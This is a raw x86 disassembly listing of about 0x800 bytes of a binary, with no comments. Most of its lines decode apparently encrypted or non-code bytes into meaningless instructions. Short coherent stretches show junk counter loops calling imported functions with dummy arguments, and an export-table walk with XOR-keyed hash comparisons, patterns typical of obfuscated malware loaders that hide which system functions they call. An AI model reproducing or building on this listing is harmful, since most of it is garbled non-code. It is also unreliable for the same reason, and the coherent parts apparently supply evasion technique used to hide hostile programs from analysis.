  41a067:	bound  ecx,QWORD PTR [ebx+ecx*4+0x800402b]
  41a06e:	pop    eax
  41a070:	cmp    eax,0xa36c791c
  41a075:	or     edx,DWORD PTR [eax]
  41a077:	or     al,0x91
  41a079:	sub    eax,0xf6c67114
  41a07e:	xor    ch,ah
  41a080:	nop
  41a081:	shl    DWORD PTR [edx-0x60e6ef3b],cl
  41a087:	pop    edi
  41a088:	mov    dl,0x2b
  41a08a:	aad    0xcf
  41a08c:	aas    
  41a08d:	ret    
  41a08e:	add    ebp,DWORD PTR cs:[eax]
  41a091:	mov    ebp,0x9e9cb234
  41a096:	ds sti 
  41a098:	popa   
  41a099:	mov    WORD PTR [edi+0x24],cs
  41a09c:	push   edi
  41a09d:	gs pop ss
  41a09f:	cs bnd jnp 0x41a119
  41a0a3:	data16 xchg BYTE PTR [edi],al
  41a0a6:	jbe    0x41a074
  41a0a8:	inc    edi
  41a0a9:	mov    edx,0xeeb78ad6
  41a0ae:	lds    eax,FWORD PTR [eax-0x19713f84]
  41a0b4:	cmovo  esp,ebx
  41a0b7:	js     0x41a064
  41a0b9:	pop    esp
  41a0ba:	imul   edx,DWORD PTR [esp],0xffffff9f
  41a0be:	push   edx
  41a0bf:	jne    0x41a0ad
  41a0c1:	mov    ch,0xa
  41a0c3:	push   ecx
  41a0c4:	ret    
  41a0c5:	lods   eax,DWORD PTR ds:[esi]
  41a0c6:	std    
  41a0c7:	(bad)  
  41a0c8:	mov    bl,0xcc
  41a0ca:	inc    esi
  41a0cb:	xchg   BYTE PTR [esi-0x51],ah
  41a0ce:	fcmovnu st,st(3)
  41a0d0:	xchg   ebp,eax
  41a0d1:	mov    ecx,0xa4eba479
  41a0d6:	les    edx,FWORD PTR [eax+0x3c]
  41a0d9:	repnz mov cl,0x49
  41a0dc:	mov    WORD PTR [edx],gs
  41a0de:	stos   BYTE PTR es:[edi],al
  41a0df:	inc    ecx
  41a0e0:	pop    eax
  41a0e1:	scas   eax,DWORD PTR es:[edi]
  41a0e2:	out    dx,al
  41a0e3:	out    0xc1,al
  41a0e5:	cs mov bl,0x1d
  41a0e8:	repnz mov bl,0xd4
  41a0eb:	mov    al,ds:0x76fd6864
  41a0f0:	mov    bh,0x21
  41a0f2:	in     al,dx
  41a0f3:	mov    ebp,0x7ca79201
  41a0f8:	in     al,0xb1
  41a0fa:	jo     0x41a100
  41a0fc:	pop    es
  41a0fd:	cmp    DWORD PTR [ecx],esp
  41a0ff:	hlt    
  41a100:	add    BYTE PTR [esi+0x12],ch
  41a103:	mov    cl,0x19
  41a105:	lock mov dh,0xe1
  41a108:	xor    dh,BYTE PTR [ebp+0x21]
  41a10b:	ret    
  41a10c:	in     eax,dx
  41a10d:	cmp    eax,0x997e9dd
  41a112:	pushf  
  41a113:	pop    ecx
  41a114:	mov    al,BYTE PTR [eax+esi*2+0x7af60b69]
  41a11b:	cmp    eax,0x2be03b30
  41a120:	call   0xfe4c:0x5a70f57c
  41a127:	jp     0x41a191
  41a129:	out    0x9a,al
  41a12b:	ror    DWORD PTR [edi],cl
  41a12d:	jb     0x41a119
  41a12f:	nop
  41a130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a131:	or     bh,BYTE PTR [ebx-0x6b26cfa9]
  41a137:	cmp    al,0xb8
  41a139:	inc    esi
  41a13a:	xchg   esp,eax
  41a13b:	int    0x10
  41a13d:	mov    bh,0xce
  41a13f:	xor    eax,0xa3d3b890
  41a144:	dec    ebx
  41a145:	ss push cs
  41a147:	mov    ebp,0x5fa92d5b
  41a14c:	dec    ecx
  41a14d:	adc    al,0x6f
  41a14f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a150:	inc    edx
  41a151:	xor    eax,0xf561c2ff
  41a156:	hlt    
  41a157:	loope  0x41a123
  41a159:	xor    BYTE PTR [esi+0x1a],dh
  41a15c:	repnz mov esp,0x440ff4c5
  41a162:	sar    BYTE PTR [eax],cl
  41a164:	mov    ebp,0x1defa11d
  41a169:	outs   dx,DWORD PTR ds:[esi]
  41a16a:	mov    es,WORD PTR [edx-0x4873ce5f]
  41a170:	jge    0x41a155
  41a172:	jmp    0x41a1b5
  41a174:	cmc    
  41a175:	clc    
  41a176:	cdq    
  41a177:	call   esp
  41a179:	das    
  41a17a:	mov    edx,0x63bd0f3b
  41a17f:	lods   eax,DWORD PTR ds:[esi]
  41a180:	push   0xffffffb9
  41a182:	shr    DWORD PTR [edx-0x5f],0x42
  41a186:	dec    eax
  41a187:	cmp    eax,0x974f7f6c
  41a18c:	test   al,0x3f
  41a18e:	mov    dl,0xdb
  41a190:	arpl   bx,ax
  41a192:	cs icebp 
  41a194:	stos   BYTE PTR es:[edi],al
  41a195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a196:	adc    BYTE PTR [esi+0x1f],bh
  41a199:	add    ecx,DWORD PTR [esi-0x4b55fee9]
  41a19f:	push   edx
  41a1a0:	cdq    
  41a1a1:	loope  0x41a14a
  41a1a3:	(bad)  
  41a1a4:	lahf   
  41a1a5:	dec    edi
  41a1a6:	pop    ecx
  41a1a7:	lahf   
  41a1a8:	into   
  41a1a9:	je     0x41a1ca
  41a1ab:	push   ebx
  41a1ac:	jg     0x41a1dc
  41a1ae:	icebp  
  41a1af:	sti    
  41a1b0:	fld    QWORD PTR cs:[edx-0x2]
  41a1b4:	xchg   edi,eax
  41a1b5:	mov    dh,0x98
  41a1b7:	js     0x41a200
  41a1b9:	dec    esp
  41a1ba:	jnp    0x41a209
  41a1bc:	add    esp,DWORD PTR [esi]
  41a1be:	lods   al,BYTE PTR ds:[esi]
  41a1bf:	add    edx,DWORD PTR [ebp-0x5b0555b4]
  41a1c5:	aam    0xab
  41a1c7:	sub    al,0x41
  41a1c9:	xchg   ebx,eax
  41a1ca:	xchg   ebx,eax
  41a1cb:	(bad)  
  41a1cc:	scas   al,BYTE PTR es:[edi]
  41a1cd:	push   ecx
  41a1ce:	fs loope 0x41a158
  41a1d1:	inc    eax
  41a1d2:	js     0x41a184
  41a1d4:	and    BYTE PTR [esi],ah
  41a1d6:	adc    DWORD PTR [edi+0x1e0c3e70],eax
  41a1dc:	add    DWORD PTR [eax+0x165c0c2e],edx
  41a1e2:	pop    ebx
  41a1e3:	xlat   BYTE PTR ds:[ebx]
  41a1e4:	addr16 cmp eax,0xbdd481c7
  41a1ea:	mov    al,0x9c
  41a1ec:	cmp    DWORD PTR [ebp+0x40],esp
  41a1ef:	(bad)  
  41a1f0:	mov    ah,0x54
  41a1f2:	int    0x39
  41a1f4:	xor    eax,0xc6b87f31
  41a1f9:	iret   
  41a1fa:	stos   BYTE PTR es:[edi],al
  41a1fb:	pop    ds
  41a1fc:	daa    
  41a1fd:	and    DWORD PTR [esi+0x79],0xffffff8b
  41a201:	inc    ebp
  41a202:	cld    
  41a203:	mov    ecx,DWORD PTR [ebp-0x20]
  41a206:	mov    DWORD PTR ds:0x42a7b1,0x1c
  41a210:	cmp    DWORD PTR ds:0x42a7b1,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42a7b1,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42a7b1
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42a7b1,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42a84d,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a76d,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a759,0x42a84d
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a2d4
  41a293:	push   esp
  41a294:	fcomp  DWORD PTR [ecx+0x787fd198]
  41a29a:	adc    BYTE PTR [esi+0x78],bh
  41a29d:	js     0x41a27f
  41a29f:	sbb    DWORD PTR [edi],esi
  41a2a1:	pop    esi
  41a2a2:	push   esp
  41a2a3:	bound  edx,QWORD PTR [ecx]
  41a2a5:	push   ebp
  41a2a6:	in     eax,0x63
  41a2a8:	leave  
  41a2a9:	inc    ecx
  41a2aa:	mov    edi,0xb6dc2a56
  41a2af:	clc    
  41a2b0:	ds and al,0xab
  41a2b3:	xor    dl,bl
  41a2b5:	ss push edx
  41a2b7:	xchg   edi,eax
  41a2b8:	mov    ebp,0xbb7a1a5e
  41a2bd:	sub    BYTE PTR [esi-0x13501a0f],dl
  41a2c3:	rol    DWORD PTR [eax],0x6d
  41a2c6:	sbb    cl,bh
  41a2c8:	adc    bl,BYTE PTR [edx+0x472eac76]
  41a2ce:	dec    ebx
  41a2cf:	xor    dl,0xf5
  41a2d2:	in     eax,0xe7
  41a2d4:	je     0x41a334
  41a2d6:	(bad)  
  41a2d7:	sti    
  41a2d8:	xor    BYTE PTR [eax],bl
  41a2da:	push   ebx
  41a2db:	int    0xc0
  41a2dd:	mov    eax,ds:0xdd48165e
  41a2e2:	loopne 0x41a30f
  41a2e4:	ins    BYTE PTR es:[edi],dx
  41a2e5:	jo     0x41a2b3
  41a2e7:	cmp    BYTE PTR [eax],cl
  41a2e9:	icebp  
  41a2ea:	idiv   DWORD PTR [esi+0x76a1febd]
  41a2f0:	pop    ss
  41a2f1:	popf   
  41a2f2:	lods   eax,DWORD PTR ds:[esi]
  41a2f3:	je     0x41a30c
  41a2f5:	sub    eax,0x964e89ff
  41a2fa:	or     al,0xc
  41a2fc:	pop    eax
  41a2fd:	xchg   edx,eax
  41a2fe:	ins    BYTE PTR es:[edi],dx
  41a2ff:	inc    eax
  41a300:	pop    ds
  41a301:	xchg   esp,eax
  41a302:	scas   al,BYTE PTR es:[edi]
  41a303:	inc    edi
  41a304:	fwait
  41a305:	cmp    ebp,DWORD PTR [eax+ecx*2]
  41a308:	push   esp
  41a309:	pop    ebx
  41a30a:	xchg   ebx,eax
  41a30b:	adc    eax,0x33cf728a
  41a310:	mov    dh,0x34
  41a312:	pop    ebp
  41a313:	push   ss
  41a314:	push   ds
  41a315:	lock ror BYTE PTR [eax],cl
  41a318:	xchg   DWORD PTR [ecx-0x5f221a8d],ecx
  41a31e:	xchg   ebp,eax
  41a31f:	rcl    edi,0xf5
  41a322:	mov    ebp,ecx
  41a324:	inc    ebp
  41a325:	mov    edx,edx
  41a327:	fdiv   st(5),st
  41a329:	stc    
  41a32a:	pop    ebx
  41a32b:	jp     0x41a313
  41a32d:	cli    
  41a32e:	add    dh,BYTE PTR [edx+edi*1-0x16ec2676]
  41a335:	loope  0x41a3b5
  41a337:	outs   dx,DWORD PTR ds:[esi]
  41a338:	pop    edx
  41a339:	js     0x41a398
  41a33b:	mov    dl,0xb6
  41a33d:	fild   QWORD PTR [edx+0x16]
  41a340:	int3   
  41a341:	inc    esi
  41a342:	sbb    eax,0xf0e90b33
  41a347:	or     al,0x52
  41a349:	hlt    
  41a34a:	dec    esp
  41a34b:	push   ebx
  41a34c:	fnstenv [ebx]
  41a34e:	xchg   ebp,eax
  41a34f:	adc    eax,0x7000956e
  41a354:	stc    
  41a355:	jmp    0xa748659
  41a35a:	cmc    
  41a35b:	jns    0x41a34d
  41a35d:	cld    
  41a35e:	aaa    
  41a35f:	jne    0x484ad305
  41a365:	add    eax,0xb3c4e330
  41a36a:	inc    edx
  41a36b:	xor    al,0x67
  41a36d:	mov    al,ds:0xaeb989b4
  41a372:	cmp    ebp,DWORD PTR [edi+0x3d]
  41a375:	jmp    0x41a38c
  41a377:	mov    bl,0x84
  41a379:	mov    edx,0xa60a3f3d
  41a37e:	sti    
  41a37f:	dec    esi
  41a380:	cld    
  41a381:	mov    eax,0x1de0e0c9
  41a386:	pop    esp
  41a387:	fs sahf 
  41a389:	icebp  
  41a38a:	std    
  41a38b:	nop
  41a38c:	stos   DWORD PTR es:[edi],eax
  41a38d:	jns    0x41a365
  41a38f:	lods   al,BYTE PTR ds:[esi]
  41a390:	jecxz  0x41a31d
  41a392:	mov    DWORD PTR [esi],ebx
  41a394:	data16 into 
  41a396:	(bad)
  41a399:	rol    DWORD PTR [ebp+0x37e6c11a],cl
  41a39f:	syscall 
  41a3a1:	or     al,0x67
  41a3a3:	add    al,0x1e
  41a3a5:	sub    al,0x3
  41a3a7:	fwait
  41a3a8:	scas   eax,DWORD PTR es:[edi]
  41a3a9:	mov    ch,0x48
  41a3ab:	pop    esp
  41a3ac:	add    eax,0xf7628e4b
  41a3b1:	arpl   ax,si
  41a3b3:	adc    BYTE PTR [esi+0x1157c5f5],0x93
  41a3ba:	xchg   edx,eax
  41a3bb:	mov    ds:0xef9495dc,eax
  41a3c0:	pop    esi
  41a3c1:	gs out 0x4b,eax
  41a3c4:	fisubr DWORD PTR [edi]
  41a3c6:	repz repz sbb al,0xdd
  41a3ca:	sbb    eax,0x153ed5f6
  41a3cf:	imul   ecx,DWORD PTR [ebx+ebp*4-0x63],0x90aab43a
  41a3d7:	aaa    
  41a3d8:	cmp    DWORD PTR [ebp-0x5d],eax
  41a3db:	jmp    0xea6f61cc
  41a3e0:	sbb    al,al
  41a3e2:	xchg   esi,eax
  41a3e3:	pop    eax
  41a3e4:	int3   
  41a3e5:	xor    eax,0xdc7aa31b
  41a3ea:	jecxz  0x41a404
  41a3ec:	mul    BYTE PTR [edx+ebx*4+0x4]
  41a3f0:	xor    eax,0xf5ad3eae
  41a3f5:	(bad)  
  41a3f6:	mov    dh,0x60
  41a3f8:	sbb    eax,0x9afee4a6
  41a3fd:	inc    esi
  41a3fe:	pop    eax
  41a3ff:	mov    edx,0x1e514cc8
  41a404:	and    edx,esi
  41a406:	mov    DWORD PTR [esi+ecx*4-0x66],0xfe322e37
  41a40e:	jecxz  0x41a393
  41a410:	ds shr ah,0xa5
  41a414:	int    0x37
  41a416:	(bad)  
  41a417:	sahf   
  41a418:	inc    ebx
  41a419:	in     al,0xb1
  41a41b:	enter  0x1c39,0x24
  41a41f:	fwait
  41a420:	scas   eax,DWORD PTR es:[edi]
  41a421:	aaa    
  41a422:	push   esi
  41a423:	lahf   
  41a424:	xor    edi,ecx
  41a426:	push   ds
  41a427:	in     eax,dx
  41a428:	dec    esi
  41a429:	ds aam 0xac
  41a42c:	clc    
  41a42d:	add    al,dl
  41a42f:	dec    esp
  41a430:	jnp    0x41a3f0
  41a432:	out    0x5e,al
  41a434:	mov    al,0xad
  41a436:	sti    
  41a437:	loopne 0x41a443
  41a439:	int3   
  41a43a:	adc    al,0x16
  41a43c:	cmp    BYTE PTR [ebx+0x64e61d29],0xc4
  41a443:	xchg   ecx,eax
  41a444:	out    dx,al
  41a445:	lock fistp WORD PTR [edi]
  41a448:	loope  0x41a447
  41a44a:	sub    ebp,ecx
  41a44c:	pop    eax
  41a44d:	stos   DWORD PTR es:[edi],eax
  41a44e:	adc    ecx,DWORD PTR [ebx]
  41a450:	add    eax,0x251a76dd
  41a455:	fwait
  41a456:	add    bh,ch
  41a458:	jl     0x41a421
  41a45a:	adc    DWORD PTR [edx],edi
  41a45c:	out    dx,al
  41a45d:	push   edi
  41a45e:	int3   
  41a45f:	inc    ecx
  41a460:	cmp    DWORD PTR [edi+ebp*1],esp
  41a463:	fsubr  st,st(1)
  41a465:	in     al,0xb5
  41a467:	sbb    eax,0x566e94e2
  41a46c:	popf   
  41a46d:	arpl   si,si
  41a46f:	mov    dh,0x90
  41a471:	hlt    
  41a472:	aas    
  41a473:	sbb    DWORD PTR [ebp-0x34],ebx
  41a476:	(bad)  
  41a477:	sar    ecx,cl
  41a479:	jb     0x41a41e
  41a47b:	pop    edx
  41a47c:	push   esp
  41a47d:	popa   
  41a47e:	jmp    0x41a47e
  41a480:	xchg   edx,eax
  41a481:	lahf   
  41a482:	int3   
  41a483:	dec    ebx
  41a484:	(bad)  {k4}{z}
  41a489:	mov    edi,0x3828da08
  41a48e:	push   0xeba68941
  41a493:	dec    esi
  41a494:	cs cli 
  41a496:	icebp  
  41a497:	call   FWORD PTR [ebx-0x3b14fb0a]
  41a49d:	rcr    DWORD PTR [ebp+0x1c],0x80
  41a4a1:	aam    0x2b
  41a4a3:	mov    al,0xd2
  41a4a5:	sbb    ebx,DWORD PTR [ecx+0x36a2952e]
  41a4ab:	(bad)  
  41a4ac:	loop   0x41a45c
  41a4ae:	push   edx
  41a4af:	inc    eax
  41a4b0:	push   es
  41a4b1:	sub    ebx,DWORD PTR [edx-0xa]
  41a4b4:	push   ebp
  41a4b5:	outs   dx,DWORD PTR ds:[esi]
  41a4b6:	mov    DWORD PTR [ebp-0x14],eax
  41a4b9:	mov    DWORD PTR ds:0x42a75d,0x18
  41a4c3:	cmp    DWORD PTR ds:0x42a75d,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a75d,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a75d
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a75d,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42a7f1,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42a7f1
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42a7f1,eax
  41a512:	cmp    DWORD PTR ds:0x42a7f1,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42a7f1,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42a7f1,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42a7f1
  41a551:	inc    eax
  41a552:	mov    ds:0x42a7f1,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a77d,0x11
  41a566:	cmp    DWORD PTR ds:0x42a77d,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a77d,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a77d
  41a590:	dec    eax
  41a591:	mov    ds:0x42a77d,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a759,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a759
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a759,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a759,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a759,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a759
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a759,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a759,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	cli    
  41a68f:	iret   
  41a690:	jge    0x41a6e8
  41a692:	mov    al,0xd7
  41a694:	jg     0x41a70e
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a6d7
  41a69b:	lds    ebp,FWORD PTR [eax-0x72]
  41a69e:	cs add al,0x7f
  41a6a1:	mov    ebx,0x814c97ae
  41a6a6:	or     al,0x2a
  41a6a8:	cmp    bl,al
  41a6aa:	aad    0x70
  41a6ac:	stc    
  41a6ad:	xchg   esp,eax
  41a6ae:	pop    eax
  41a6af:	cmp    dl,dl
  41a6b1:	test   al,0xd6
  41a6b3:	jg     0x41a6d8
  41a6b5:	jne    0x41a64b
  41a6b7:	addr16 (bad) 
  41a6b9:	jg     0x41a6ec
  41a6bb:	dec    ecx
  41a6bc:	inc    esi
  41a6bd:	das    
  41a6be:	and    BYTE PTR [ebx-0x4042ef9a],ah
  41a6c4:	jns    0x41a69c
  41a6c6:	popa   
  41a6c7:	in     eax,0xc8
  41a6c9:	push   es
  41a6ca:	fcomp  DWORD PTR [ebx+0x74]
  41a6cd:	cli    
  41a6ce:	popf   
  41a6cf:	or     DWORD PTR [edi+0x5e],ebx
  41a6d2:	push   0xffffffe3
  41a6d4:	jns    0x41a65d
  41a6d6:	sub    ebp,ebp
  41a6d8:	test   DWORD PTR [edx],ecx
  41a6da:	jno    0x41a709
  41a6dc:	xor    bh,BYTE PTR [ebx-0x18]
  41a6df:	mov    al,0xc7
  41a6e1:	test   DWORD PTR [ecx],0x9f094395
  41a6e7:	loope  0x41a6ad
  41a6e9:	jmp    0x41a6d4
  41a6eb:	jmp    0xc5b69f48
  41a6f0:	mov    ch,0xb3
  41a6f2:	inc    edi
  41a6f3:	ret    0xeb07
  41a6f6:	or     DWORD PTR [ebx-0x55],edx
  41a6f9:	clc    
  41a6fa:	test   edi,edx
  41a6fc:	scas   al,BYTE PTR es:[edi]
  41a6fd:	mov    cl,0xf
  41a6ff:	neg    DWORD PTR [eax-0x1d]
  41a702:	or     eax,edx
  41a704:	mov    al,0xe7
  41a706:	jns    0x41a73c
  41a708:	popa   
  41a709:	sub    BYTE PTR [esi-0x12],bh
  41a70c:	sbb    eax,0x2abd456
  41a711:	and    esi,edi
  41a713:	std    
  41a714:	add    al,0x61
  41a716:	test   eax,0xfa516f46
  41a71c:	out    dx,al
  41a71d:	mov    ebx,0xe83bf794
  41a722:	sbb    ecx,ecx
  41a724:	into   
  41a725:	add    eax,edx
  41a727:	inc    esp
  41a728:	sub    cl,BYTE PTR [edi+0x4f]
  41a72b:	fisubr DWORD PTR [ecx-0x4e]
  41a72e:	js     0x41a71a
  41a730:	ret    
  41a731:	out    0xc0,eax
  41a733:	fcomi  st,st(0)
  41a735:	pop    edx
  41a736:	mov    esp,0x4eaaa0ac
  41a73b:	sbb    DWORD PTR [ecx+0x772dfc7a],eax
  41a741:	enter  0x748d,0x39
  41a745:	aas    
  41a746:	inc    edi
  41a747:	in     eax,dx
  41a748:	outs   dx,DWORD PTR ds:[esi]
  41a749:	xchg   ecx,eax
  41a74a:	ret    
  41a74b:	mov    al,0x39
  41a74d:	pop    eax
  41a74e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a74f:	cmc    
  41a750:	iret   
  41a751:	mov    dl,0x53
  41a753:	retf   
  41a754:	inc    edi
  41a755:	ins    DWORD PTR es:[edi],dx
  41a756:	or     al,0x35
  41a758:	icebp  
  41a759:	add    BYTE PTR [ecx],dh
  41a75b:	ret    0x4719
  41a75e:	cli    
  41a75f:	in     eax,dx
  41a760:	fdivr  QWORD PTR [esp+eax*8+0x3e]
  41a764:	rcr    DWORD PTR [edi+0x61],cl
  41a767:	out    0x25,al
  41a769:	and    BYTE PTR [eax],0xd8
  41a76c:	addr16 pop edx
  41a76e:	loopne 0x41a7bb
  41a770:	or     bl,BYTE PTR [eax+edi*1]
  41a773:	pop    es
  41a774:	cmc    
  41a775:	aam    0x69
  41a777:	and    esi,edi
  41a779:	or     BYTE PTR [esi-0x80],cl
  41a77c:	cwde   
  41a77d:	mov    fs,WORD PTR [edi+0x2f]
  41a780:	inc    ecx
  41a781:	sbb    al,0xcb
  41a783:	clc    
  41a784:	inc    ebp
  41a785:	nop
  41a786:	(bad)  
  41a787:	fadd   DWORD PTR [ecx]
  41a789:	data16 mov dh,0x4b
  41a78c:	mov    DWORD PTR [ecx-0x52],0x6b91a0b0
  41a793:	mov    ds:0xbc2705fa,al
  41a798:	mov    al,ds:0xb2438363
  41a79d:	fmul   QWORD PTR [eax]
  41a79f:	mov    ebp,0x431b686e
  41a7a4:	jb     0x41a75e
  41a7a6:	fs push ds
  41a7a8:	xchg   edi,eax
  41a7a9:	cdq    
  41a7aa:	dec    ebx
  41a7ab:	push   edx
  41a7ac:	lea    ebp,[ebx+0x7e]
  41a7af:	jnp    0x41a820
  41a7b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7b2:	xchg   BYTE PTR [esi],bl
  41a7b4:	add    eax,0x914f0d69
  41a7b9:	outs   dx,DWORD PTR ds:[esi]
  41a7ba:	inc    ebp
  41a7bb:	xchg   DWORD PTR [esi],eax
  41a7bd:	cmp    bl,BYTE PTR [ecx+0x20]
  41a7c0:	cdq    
  41a7c1:	mov    esp,0xabae7ff8
  41a7c6:	std    
  41a7c7:	repz gs mov ebx,0xeee978e0
  41a7ce:	mov    eax,0xde89cf43
  41a7d3:	pop    ecx
  41a7d4:	xchg   edx,eax
  41a7d5:	and    ecx,DWORD PTR [ebp-0x64]
  41a7d8:	push   0x4846b5dd
  41a7dd:	hlt    
  41a7de:	shl    DWORD PTR [esp+eiz*4],cl
  41a7e1:	pop    ebp
  41a7e2:	sub    DWORD PTR [eax-0xd],esi
  41a7e5:	(bad)  
  41a7e6:	enter  0xe4ee,0xca
  41a7ea:	fdiv   QWORD PTR [edx]
  41a7ec:	pushf  
  41a7ed:	xor    eax,0x41b4ed0a
  41a7f2:	ret    0x8c15
  41a7f5:	add    DWORD PTR [ebp+0x2f5f7963],0x32c500ad
  41a7ff:	pop    es
  41a800:	mov    al,0x39
  41a802:	pop    ebx
  41a803:	(bad)  
  41a804:	clc    
  41a805:	pop    edi
  41a806:	xlat   BYTE PTR ds:[ebx]
  41a807:	xchg   esp,eax
  41a808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a809:	hlt    
  41a80a:	bound  esi,QWORD PTR ds:0x8c42ffe4
  41a810:	mov    ecx,0x920a7db9
  41a815:	(bad)  
  41a816:	hlt    
  41a817:	and    BYTE PTR [ebx-0x194a8452],ah
  41a81d:	repnz bound edx,QWORD PTR [ebp+0x3c7c53cc]
  41a824:	in     al,dx
  41a825:	pop    ebp
  41a826:	cmp    eax,0xe7352844
  41a82b:	not    BYTE PTR [eax-0x23]
  41a82e:	ds icebp 
  41a830:	js     0x41a7cf
  41a832:	call   0xc54968f4
  41a837:	repnz pop ebp
  41a839:	push   ebp
  41a83a:	mov    dh,0x8f
  41a83c:	and    DWORD PTR [edx+0x2e],esi
  41a83f:	jmp    0x7ba931ee
  41a844:	inc    esi
  41a845:	dec    eax
  41a846:	(bad)  
  41a847:	dec    edi
  41a848:	ror    eax,0x8a
  41a84b:	jg     0x41a876
  41a84d:	std    
  41a84e:	sbb    al,al
  41a850:	jne    0x41a838
  41a852:	mov    eax,ds:0xc4283bc6
  41a857:	mov    dh,0x87
  41a859:	ficom  DWORD PTR [ecx+0x594870a8]
  41a85f:	sub    DWORD PTR [eax-0x606db86c],ebp
  41a865:	repz pushw cs
  41a868:	js     0x41a881
  41a86a:	out    dx,eax
  41a86b:	add    DWORD PTR ds:0xeb693b3a,ebp
